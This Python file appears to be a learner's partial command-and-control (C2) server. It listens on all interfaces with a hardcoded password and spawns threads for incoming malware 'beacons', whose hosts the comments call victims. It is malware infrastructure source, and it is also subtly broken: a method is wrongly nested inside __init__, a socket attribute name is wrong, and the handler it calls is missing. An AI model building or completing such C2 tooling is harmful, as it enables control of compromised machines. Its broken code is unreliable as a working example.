import socket 
import threading 
import json
import time
from encrypt import EncryptedCommunicator

class C2Server:
    #This init is in charge of setting up the network configuarations
    # host='0.0.0.0' means to listen on any and all network interfaces 
    # port=8080 is just the specific network port to listen on
    # active_session is the dict to track all connected victums
    # session counter just gives each beacon an ID    
    def __init__(self, host='0.0.0.0', port=8080, password='Mr.Robot'): 
        self.host = host 
        self. port = port
        self.password = password
        self.active_session = {}
        self.session_counter = 0

        self.encryptor = EncryptedCommunicator(password) # This is pretty much creating the encryption engine that we will use to encrypt data in the this server code

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a new socket, IPV4, TCP
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) #sets the options, the option that is being set is SO_REUSEADDR 
                                                                              #so that we can reconnect to the same local address after the server stops.

        def start_server(self):
            try:
                self.server_sock.bind((self.host, self.port)) #this is claiming the IP address and port of our server which we set up earlier
                self.server_sock.listen(5) #this allows for up to 5 beacons to wait in line while the server is busy
                print(f"C2 Server is listenting on {self.host}:{self.port}")
                print(f"waiting for beacon the beacon to connect......")

                while True: #this is acting as a beacon connection acceptor
                    client_socket, client_address = self.server_socket.accept() #this is giving a new socket object and IP/port that is dedicated to that newley connected beacon
                                                                                #the accept is waiting indefinitely for a new connection  
                    print(f"New beacon connection from {client_address}") 

                    client_thread = threading.Thread( #creates a parallel thread, like opening a new tab in browser
                        target=self.handle_beacon, #this is running the handle_beacon function inside of the new thread 
                        args=(client_socket, client_address) #giving handle_beacon the beacons address and socket
                    )
                    client_thread.daemon = True #daemon thread, it will die if the main thread (server) exits
                    client_thread.start() #begins running this new thread
                    
                     


